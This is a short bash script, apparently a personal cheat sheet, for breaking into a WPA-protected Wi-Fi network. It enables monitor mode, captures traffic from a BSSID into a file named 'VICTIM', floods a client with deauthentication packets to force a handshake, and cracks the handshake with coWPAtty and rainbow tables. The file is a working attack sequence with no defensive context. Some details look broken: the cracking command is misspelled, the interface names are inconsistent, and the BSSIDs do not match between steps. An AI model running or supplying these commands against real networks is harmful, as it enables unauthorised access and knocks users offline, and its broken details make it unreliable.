#!/bin/bash

#----------------------------------------------------------------------------------------#
#	cowpatty  #
#----------------------------------------------------------------------------------------#

# monitor mode
airmon-ng start wlan0

# kismet ?
# kismet -c RT2870.wlan0.ALFA

# scan for networks
airodump-ng mon0

# filter scan for network bssid
airodump-ng -c 11 --bssid 00:01:3B:97:D0:02 -w VICTIM wlan0

# -c 11 = channel 11
# --bssid 00:01:3B:97:D0:02 = network bssid
# -w VICTIM = write file out to VICTIM
# mon0 = network interface in monitor mode


# capture 4 way handshake


# deauth client
aireplay-ng -0 30 -a 00:18:4D:3A:FE:E8 -c 04:0C:CE:D3:B5:9E wlan0

# -0 30 = deauth 30 packets
# -a 00:18:4D:3A:FE:E8 = bssid
# -c 04:0C:CE:D3:B5:9E = client
# wlan0 = interface

# wpa handshake

# cowpatty
cowpaty -r NETGEAR_b-01.cap -d /path/to/rainbowtables/netgear.wpa -s NETGEAR

# -r NETGEAR_b-01.cap = packet capture file
# -d /path/to/rainbowtables/netgear.wpa = hash file rainbow tables
# -s NETGEAR = ssid






